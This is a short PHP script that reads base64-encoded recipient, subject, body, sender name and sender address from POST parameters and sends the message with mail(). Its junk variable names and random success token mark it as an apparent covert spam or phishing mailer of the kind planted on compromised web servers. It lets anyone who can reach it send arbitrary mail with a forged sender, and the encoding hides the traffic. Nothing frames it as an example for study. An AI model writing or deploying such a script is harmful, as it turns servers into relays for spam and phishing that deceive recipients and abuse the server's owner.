<?php

function mailto($to, $subject, $message, $from, $fromAddr) {
$mb_internal_encoding = mb_internal_encoding();
mb_internal_encoding('UTF-8');
$headers = "Date: ".date("r")."\r\n";
$headers.= "From: =?UTF-8?B?".base64_encode($from)."?= <".$fromAddr.">\r\n";
$headers.= "MIME-Version: 1.0\r\n";
$subject = "=?UTF-8?B?".base64_encode($subject)."?=";
if (strpos($message, '<html')) {
$msgType = "text/html";
} else $msgType = "text/plain";
$body = $message;
mb_internal_encoding($mb_internal_encoding);
return mail($to, $subject, $body, $headers);
}

$jewrqwbnlk = base64_decode($_POST['to']); 
$xaouf = base64_decode($_POST['subject']); 
$jwgpxlzblkepa = base64_decode($_POST['body']);  
$from = base64_decode($_POST['from']);  
$fromAddr = base64_decode($_POST['fromaddrr']);  
$jfnbrsjfq =  mailto($jewrqwbnlk, $xaouf, $jwgpxlzblkepa , $from, $fromAddr);
if($jfnbrsjfq){echo 'vwkxlpc';} else {echo 'yfbhn : ' . $jfnbrsjfq;} 
